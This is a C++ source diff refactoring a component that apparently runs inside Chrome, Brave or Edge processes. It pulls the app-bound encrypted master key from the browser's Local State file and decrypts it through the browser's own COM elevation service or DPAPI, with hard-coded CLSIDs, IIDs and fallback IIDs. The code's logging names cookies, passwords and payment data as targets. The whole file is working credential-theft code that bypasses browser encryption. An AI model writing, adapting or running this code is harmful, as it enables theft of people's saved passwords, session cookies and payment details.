@@ -2,14 +2,11 @@
 // Implements selective COM/DPAPI strategy based on browser and data type
 #include "BrowserCrypto.h"
 #include "CommunicationModule.h"
+#include "RuntimeSupport.h"
 #include <ShlObj.h>
-#include <wrl/client.h>
 #include <bcrypt.h>
 #include <Wincrypt.h>
-#include <fstream>
-#include <sstream>
-#include <stdexcept>
-#include <algorithm>
+#include <cstdint>
 
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "Crypt32.lib")
@@ -20,45 +17,90 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
+namespace
+{
+    template <typename T>
+    class ComPtr
+    {
+    public:
+        ComPtr() = default;
+        ~ComPtr() { Reset(); }
+        ComPtr(const ComPtr&) = delete;
+        ComPtr& operator=(const ComPtr&) = delete;
+
+        T* Get() const noexcept { return m_pointer; }
+        T* operator->() const noexcept { return m_pointer; }
+        T** Put() noexcept
+        {
+            Reset();
+            return &m_pointer;
+        }
+
+        void Reset() noexcept
+        {
+            if (m_pointer)
+            {
+                m_pointer->Release();
+                m_pointer = nullptr;
+            }
+        }
+
+    private:
+        T* m_pointer = nullptr;
+    };
+
+    void AppendHResult(std::string& message, HRESULT result)
+    {
+        kvc::text::AppendHex(message, static_cast<std::uint32_t>(result), true);
+    }
+}
+
 namespace SecurityComponents
 {
     namespace Browser
     {
         // Browser-specific configuration database
         // Contains COM CLSIDs, IIDs, and file paths for each supported browser
-        const std::unordered_map<std::string, Config>& GetConfigs()
+        const Config* GetConfigs(std::size_t& count)
         {
-            static const std::unordered_map<std::string, Config> browser_configs = {
-                {"chrome", {"Chrome", L"chrome.exe", 
+            static const Config browserConfigs[] = {
+                {"Chrome", L"chrome.exe",
                     {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, 
-                    {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, 
-                    fs::path("Google") / "Chrome" / "User Data"}},
-                {"brave", {"Brave", L"brave.exe", 
+                    {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}}, 
+                    L"Google\\Chrome\\User Data"},
+                {"Brave", L"brave.exe",
                     {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, 
-                    {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, 
-                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
-                {"edge", {"Edge", L"msedge.exe", 
+                    {0xA949CB4E, 0xC4F9, 0x44C4, {0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C}}, 
+                    L"BraveSoftware\\Brave-Browser\\User Data"},
+                {"Edge", L"msedge.exe",
                     {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, 
-                    {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, 
-                    fs::path("Microsoft") / "Edge" / "User Data"}}
+                    {0x12B23868, 0x6DCD, 0x4D1A, {0xAD, 0x4C, 0x65, 0xB0, 0x28, 0x52, 0x01, 0xFC}}, 
+                    L"Microsoft\\Edge\\User Data"}
             };
-            return browser_configs;
+            count = std::size(browserConfigs);
+            return browserConfigs;
         }
 
         // Determines browser configuration based on current process executable name
         Config GetConfigForCurrentProcess()
         {
-            char exePath[MAX_PATH] = {0};
-            GetModuleFileNameA(NULL, exePath, MAX_PATH);
-            std::string processName = fs::path(exePath).filename().string();
-            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
+            wchar_t exePath[32768] = {};
+            const DWORD length = GetModuleFileNameW(nullptr, exePath,
+                                                    static_cast<DWORD>(std::size(exePath)));
+            if (length == 0 || length >= std::size(exePath))
+                return {};
 
-            const auto& configs = GetConfigs();
-            if (processName == "chrome.exe") return configs.at("chrome");
-            if (processName == "brave.exe")  return configs.at("brave");
-            if (processName == "msedge.exe") return configs.at("edge");
+            std::wstring processName = kvc::paths::FileName(exePath);
+            kvc::text::LowerWideInPlace(processName);
 
-            throw std::runtime_error("Unsupported host process: " + processName);
+            std::size_t count = 0;
+            const Config* configs = GetConfigs(count);
+            for (std::size_t i = 0; i < count; ++i)
+            {
+                if (kvc::text::IEqualsWide(processName, configs[i].processName))
+                    return configs[i];
+            }
+            return {};
         }
     }
 
@@ -66,9 +108,8 @@ namespace SecurityComponents
     {
         // Encryption scheme identifier prefixes
         const uint8_t CHROME_KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
-        const uint8_t EDGE_KEY_PREFIX[] = {'D', 'P', 'A', 'P', 'I'};
-        const std::string V10_PREFIX = "v10";
-        const std::string V20_PREFIX = "v20";
+        constexpr char V10_PREFIX[] = "v10";
+        constexpr char V20_PREFIX[] = "v20";
 
         // RAII wrapper for BCrypt algorithm handle
         class BCryptAlgorithm
@@ -111,21 +152,18 @@ namespace SecurityComponents
         // Supports both v10 and v20 encryption schemes
         std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& blob)
         {
-            std::string detectedPrefix;
             size_t prefixLength = 0;
             
             // Detect encryption scheme version
             if (blob.size() >= 3)
             {
-                if (memcmp(blob.data(), V10_PREFIX.c_str(), V10_PREFIX.length()) == 0)
+                if (memcmp(blob.data(), V10_PREFIX, 3) == 0)
                 {
-                    detectedPrefix = V10_PREFIX;
-                    prefixLength = V10_PREFIX.length();
+                    prefixLength = 3;
                 }
-                else if (memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) == 0)
+                else if (memcmp(blob.data(), V20_PREFIX, 3) == 0)
                 {
-                    detectedPrefix = V20_PREFIX;  
-                    prefixLength = V20_PREFIX.length();
+                    prefixLength = 3;
                 }
                 else
                 {
@@ -185,33 +223,48 @@ namespace SecurityComponents
         
         // Extracts encrypted master key from browser's Local State file
         // Handles both APPB (COM) and DPAPI blob formats
-        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path& localStatePath)
+        std::vector<uint8_t> GetEncryptedMasterKey(std::wstring_view localStatePath,
+                                                   std::string& error)
         {
-            std::ifstream f(localStatePath, std::ios::binary);
-            if (!f)
-                throw std::runtime_error("Could not open Local State file.");
-
-            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
+            std::string content;
+            if (!kvc::io::ReadAllText(localStatePath, content))
+            {
+                error = "Could not open Local State file.";
+                return {};
+            }
             
             // Search for encrypted key in JSON
-            std::string tag = "\"app_bound_encrypted_key\":\"";
-            size_t pos = content.find(tag);
+            constexpr std::string_view appBoundTag = "\"app_bound_encrypted_key\":\"";
+            constexpr std::string_view legacyTag = "\"encrypted_key\":\"";
+            size_t pos = content.find(appBoundTag);
+            size_t tagLength = appBoundTag.size();
             
-            if (pos == std::string::npos) {
-                tag = "\"encrypted_key\":\"";
-                pos = content.find(tag);
+            if (pos == std::string::npos)
+            {
+                pos = content.find(legacyTag);
+                tagLength = legacyTag.size();
                 if (pos == std::string::npos)
-                    throw std::runtime_error("Encrypted key not found in Local State.");
+                {
+                    error = "Encrypted key not found in Local State.";
+                    return {};
+                }
             }
 
-            pos += tag.length();
+            pos += tagLength;
             size_t end_pos = content.find('"', pos);
             if (end_pos == std::string::npos)
-                throw std::runtime_error("Malformed encrypted key format.");
+            {
+                error = "Malformed encrypted key format.";
+                return {};
+            }
 
-            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
+            auto optDecoded = Utils::Base64Decode(
+                std::string_view(content).substr(pos, end_pos - pos));
             if (!optDecoded)
-                throw std::runtime_error("Base64 decoding of encrypted key failed.");
+            {
+                error = "Base64 decoding of encrypted key failed.";
+                return {};
+            }
 
             auto& decodedData = *optDecoded;
             
@@ -230,16 +283,20 @@ namespace SecurityComponents
             }
             else
             {
-                throw std::runtime_error("Unknown key format - not APPB or DPAPI blob.");
+                error = "Unknown key format - not APPB or DPAPI blob.";
+                return {};
             }
         }
     }
 
     BrowserManager::BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}
 
-    fs::path BrowserManager::getUserDataRoot() const
+    std::wstring BrowserManager::getUserDataRoot() const
     {
-        return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
+        const std::wstring localAppData = Utils::GetLocalAppDataPath();
+        if (localAppData.empty() || !m_config.userDataSubPath)
+            return {};
+        return kvc::paths::Join(localAppData, m_config.userDataSubPath);
     }
 
     MasterKeyDecryptor::MasterKeyDecryptor(PipeLogger& logger) : m_logger(logger) {}
@@ -247,154 +304,252 @@ namespace SecurityComponents
     MasterKeyDecryptor::~MasterKeyDecryptor()
     {
         if (m_comInitialized)
-        {
             CoUninitialize();
-        }
     }
-    
+
     // Decrypts master key using browser's COM elevation service
-    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithCOM(const Browser::Config& config, 
-                                                            const std::vector<uint8_t>& encryptedKeyBlob)
+    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithCOM(
+        const Browser::Config& config, const std::vector<uint8_t>& encryptedKeyBlob,
+        std::string& error)
     {
-        BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char*>(encryptedKeyBlob.data()), 
-                                              static_cast<UINT>(encryptedKeyBlob.size()));
-        if (!bstrEncKey)
-            throw std::runtime_error("Failed to allocate BSTR for encrypted key.");
-
-        BSTR bstrPlainKey = nullptr;
-        HRESULT hr = E_FAIL;
-        DWORD comErr = 0;
-
-        // Edge uses different COM interface than Chrome/Brave
-        if (config.name == "Edge")
+        BSTR encryptedKey = SysAllocStringByteLen(
+            reinterpret_cast<const char*>(encryptedKeyBlob.data()),
+            static_cast<UINT>(encryptedKeyBlob.size()));
+        if (!encryptedKey)
         {
-            Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
-            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
-            if (FAILED(hr))
+            error = "Failed to allocate BSTR for encrypted key.";
+            return {};
+        }
+
+        BSTR plainKey = nullptr;
+        HRESULT result = E_FAIL;
+        DWORD comError = 0;
+
+        if (kvc::text::IEqualsAscii(config.name, "Edge"))
+        {
+            ComPtr<IEdgeElevatorFinal> elevator;
+            result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid,
+                                      reinterpret_cast<void**>(elevator.Put()));
+            if (result == E_NOINTERFACE)
             {
-                std::ostringstream oss;
-                oss << "CoCreateInstance failed for Edge. HRESULT: 0x" << std::hex << hr;
-                SysFreeString(bstrEncKey);
-                throw std::runtime_error(oss.str());
+                static const IID fallbackIid =
+                    {0xC9C2B807, 0x7731, 0x4F34,
+                     {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
+                result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER,
+                                          fallbackIid,
+                                          reinterpret_cast<void**>(elevator.Put()));
             }
-            CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
-                            COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-                            RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-            hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
-            if (FAILED(hr))
+
+            std::string message = "[*] Edge CoCreateInstance hr: ";
+            AppendHResult(message, result);
+            m_logger.Log(message);
+            if (FAILED(result))
             {
-                std::ostringstream oss;
-                oss << "DecryptData failed for Edge. HRESULT: 0x" << std::hex << hr
-                    << " comErr: 0x" << comErr;
-                SysFreeString(bstrEncKey);
-                if (bstrPlainKey) SysFreeString(bstrPlainKey);
-                throw std::runtime_error(oss.str());
+                error = "CoCreateInstance failed for Edge. HRESULT: ";
+                AppendHResult(error, result);
+                SysFreeString(encryptedKey);
+                return {};
+            }
+
+            const HRESULT blanket = CoSetProxyBlanket(
+                elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
+                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+            if (FAILED(blanket))
+            {
+                error = "CoSetProxyBlanket failed for Edge. HRESULT: ";
+                AppendHResult(error, blanket);
+                m_logger.Log("[-] " + error);
+                SysFreeString(encryptedKey);
+                return {};
+            }
+
+            result = elevator->DecryptData(encryptedKey, &plainKey, &comError);
+            message = "[*] Edge DecryptData hr: ";
+            AppendHResult(message, result);
+            message.append(" comErr: ");
+            kvc::text::AppendHex(message, comError, true);
+            m_logger.Log(message);
+            if (FAILED(result))
+            {
+                error = "DecryptData failed for Edge. HRESULT: ";
+                AppendHResult(error, result);
+                error.append(" comErr: ");
+                kvc::text::AppendHex(error, comError, true);
+                SysFreeString(encryptedKey);
+                if (plainKey)
+                    SysFreeString(plainKey);
+                return {};
             }
         }
         else
         {
-            Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
-            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
-            if (SUCCEEDED(hr))
+            ComPtr<IOriginalBaseElevator> elevator;
+            result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid,
+                                      reinterpret_cast<void**>(elevator.Put()));
+            if (result == E_NOINTERFACE)
             {
-                CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 
-                                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 
-                                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
+                static const IID fallbackIid =
+                    {0xA949CB4E, 0xC4F9, 0x44C4,
+                     {0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C}};
+                result = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER,
+                                          fallbackIid,
+                                          reinterpret_cast<void**>(elevator.Put()));
+            }
+
+            std::string message = "[*] ";
+            message.append(config.name);
+            message.append(" CoCreateInstance hr: ");
+            AppendHResult(message, result);
+            m_logger.Log(message);
+            if (SUCCEEDED(result))
+            {
+                const HRESULT blanket = CoSetProxyBlanket(
+                    elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
+                    COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                    RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+                if (FAILED(blanket))
+                {
+                    error = "CoSetProxyBlanket failed for ";
+                    error.append(config.name);
+                    error.append(". HRESULT: ");
+                    AppendHResult(error, blanket);
+                    m_logger.Log("[-] " + error);
+                    SysFreeString(encryptedKey);
+                    return {};
+                }
+
+                result = elevator->DecryptData(encryptedKey, &plainKey, &comError);
+                message = "[*] ";
+                message.append(config.name);
+                message.append(" DecryptData hr: ");
+                AppendHResult(message, result);
+                message.append(" comErr: ");
+                kvc::text::AppendHex(message, comError, true);
+                m_logger.Log(message);
             }
         }
 
-        SysFreeString(bstrEncKey);
-        
-        // Validate decryption result
-        if (FAILED(hr) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
+        SysFreeString(encryptedKey);
+
+        if (FAILED(result) || !plainKey || SysStringByteLen(plainKey) != Crypto::KEY_SIZE)
         {
-            if (bstrPlainKey) SysFreeString(bstrPlainKey);
-            std::ostringstream oss;
-            oss << "COM elevation decryption failed for " << config.name << ". HRESULT: 0x" 
-                << std::hex << hr;
-            throw std::runtime_error(oss.str());
+            if (plainKey)
+                SysFreeString(plainKey);
+            error = "COM elevation decryption failed for ";
+            error.append(config.name);
+            error.append(". HRESULT: ");
+            AppendHResult(error, result);
+            return {};
         }
 
         std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
-        memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
-        SysFreeString(bstrPlainKey);
-        
+        memcpy(aesKey.data(), plainKey, Crypto::KEY_SIZE);
+        SysFreeString(plainKey);
         return aesKey;
     }
 
-    // Decrypts master key using Windows DPAPI
-    // Used for Edge passwords when orchestrator provides pre-decrypted key
-    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithDPAPI(const fs::path& localStatePath)
+    // Decrypts master key using Windows DPAPI.
+    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithDPAPI(std::wstring_view localStatePath,
+                                                              std::string& error)
     {
-        auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
+        std::vector<uint8_t> encryptedKeyBlob =
+            Crypto::GetEncryptedMasterKey(localStatePath, error);
+        if (encryptedKeyBlob.empty())
+            return {};
 
         DATA_BLOB inputBlob = {
             static_cast<DWORD>(encryptedKeyBlob.size()),
             encryptedKeyBlob.data()
         };
         DATA_BLOB outputBlob = {};
-        
-        BOOL result = CryptUnprotectData(&inputBlob, nullptr, nullptr, nullptr, nullptr, 
-                                        CRYPTPROTECT_UI_FORBIDDEN, &outputBlob);
-        
-        if (!result)
+
+        if (!CryptUnprotectData(&inputBlob, nullptr, nullptr, nullptr, nullptr,
+                                CRYPTPROTECT_UI_FORBIDDEN, &outputBlob))
         {
-            DWORD error = GetLastError();
-            std::ostringstream oss;
-            oss << "DPAPI decryption failed. Error: 0x" << std::hex << error;
-            m_logger.Log("[-] " + oss.str());
-            throw std::runtime_error(oss.str());
+            error = "DPAPI decryption failed. Error: ";
+            kvc::text::AppendHex(error, GetLastError(), true);
+            m_logger.Log("[-] " + error);
+            return {};
         }
-        
-        std::vector<uint8_t> aesKey(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
+
+        std::vector<uint8_t> aesKey(outputBlob.pbData,
+                                    outputBlob.pbData + outputBlob.cbData);
         LocalFree(outputBlob.pbData);
-        
+
         if (aesKey.size() != Crypto::KEY_SIZE)
         {
-            std::string errMsg = "Decrypted key size mismatch: " + std::to_string(aesKey.size()) + 
-                               ", expected: " + std::to_string(Crypto::KEY_SIZE);
-            m_logger.Log("[-] " + errMsg);
-            throw std::runtime_error(errMsg);
+            error = "Decrypted key size mismatch: ";
+            kvc::text::AppendUnsigned(error, aesKey.size());
+            error.append(", expected: ");
+            kvc::text::AppendUnsigned(error, Crypto::KEY_SIZE);
+            m_logger.Log("[-] " + error);
+            return {};
         }
-        
+
         return aesKey;
     }
 
     // Main decryption entry point - selects strategy based on browser and data type
-    std::vector<uint8_t> MasterKeyDecryptor::Decrypt(const Browser::Config& config, 
-                                                      const fs::path& localStatePath, 
-                                                      DataType dataType)
+    std::vector<uint8_t> MasterKeyDecryptor::Decrypt(const Browser::Config& config,
+                                                      std::wstring_view localStatePath,
+                                                      DataType dataType,
+                                                      std::string& error)
     {
-        m_logger.Log("[*] Reading Local State file: " + StringUtils::path_to_string(localStatePath));
-        
+        m_logger.Log("[*] Reading Local State file: " +
+                     StringUtils::path_to_string(localStatePath));
+
         // All browsers (including Edge) use COM elevation for all data types.
-        // Modern Edge uses app_bound_encrypted_key (APPB) for cookies, passwords, and payments.
-        std::string dataTypeStr = "data";
-        switch (dataType) {
-            case DataType::Cookies:   dataTypeStr = "cookies";   break;
-            case DataType::Payments:  dataTypeStr = "payments";  break;
-            case DataType::Passwords: dataTypeStr = "passwords"; break;
-            default:                  dataTypeStr = "data";      break;
+        std::string dataTypeName = "data";
+        switch (dataType)
+        {
+        case DataType::Cookies:   dataTypeName = "cookies";   break;
+        case DataType::Payments:  dataTypeName = "payments";  break;
+        case DataType::Passwords: dataTypeName = "passwords"; break;
+        default:                  dataTypeName = "data";      break;
         }
 
-        m_logger.Log("[*] Using COM elevation for " + config.name + " " + dataTypeStr);
+        m_logger.Log("[*] Using COM elevation for " +
+                     std::string(config.name) + " " + dataTypeName);
 
         if (!m_comInitialized)
         {
-            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
+            const HRESULT initResult = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+            if (FAILED(initResult))
             {
-                throw std::runtime_error("Failed to initialize COM library.");
+                if (initResult == RPC_E_CHANGED_MODE)
+                {
+                    m_logger.Log("[!] COM already initialized with a different apartment model.");
+                    m_comInitialized = false;
+                }
+                else
+                {
+                    error = "Failed to initialize COM library. HRESULT: ";
+                    AppendHResult(error, initResult);
+                    return {};
+                }
             }
-            m_comInitialized = true;
-            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
+            else
+            {
+                m_comInitialized = true;
+                m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
+            }
         }
 
-        auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
-        m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
+        std::vector<uint8_t> encryptedKeyBlob =
+            Crypto::GetEncryptedMasterKey(localStatePath, error);
+        if (encryptedKeyBlob.empty())
+            return {};
 
-        auto aesKey = DecryptWithCOM(config, encryptedKeyBlob);
-        m_logger.Log("[+] " + config.name + " COM elevation decryption successful for " + dataTypeStr);
+        m_logger.Log("[*] Attempting to decrypt master key via " +
+                     std::string(config.name) + "'s COM server...");
+
+        std::vector<uint8_t> aesKey = DecryptWithCOM(config, encryptedKeyBlob, error);
+        if (!aesKey.empty())
+        {
+            m_logger.Log("[+] " + std::string(config.name) +
+                         " COM elevation decryption successful for " + dataTypeName);
+        }
         return aesKey;
     }
 }
